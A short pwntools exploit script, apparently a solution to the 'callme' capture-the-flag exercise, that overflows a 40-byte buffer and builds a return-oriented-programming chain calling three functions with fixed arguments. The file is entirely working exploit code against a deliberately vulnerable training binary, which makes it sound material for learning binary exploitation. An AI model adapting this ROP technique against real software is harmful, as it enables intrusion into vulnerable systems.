#!/usr/bin/env python2
from pwn import *
context(arch='amd64', os='linux')

def pwn():

    e = ELF("./callme")

    ''' Create buffer '''
    buf = "A" * 40

    callme_one = p64(e.symbols["callme_one"])
    callme_two = p64(e.symbols["callme_two"])
    callme_three = p64(e.symbols["callme_three"])
    pop3_reg = p64(e.symbols["usefulGadgets"])

    # Our arguments
    val1 = p64(0x1)
    val2 = p64(0x2)
    val3 = p64(0x3)

    parameters = val1 + val2 + val3

    io = e.process()

    f_one = pop3_reg + parameters + callme_one
    f_two = pop3_reg + parameters + callme_two
    f_three = pop3_reg + parameters + callme_three

    io.sendline(buf + f_one + f_two + f_three)
    print(io.recvall())

if __name__ == '__main__':
    pwn()
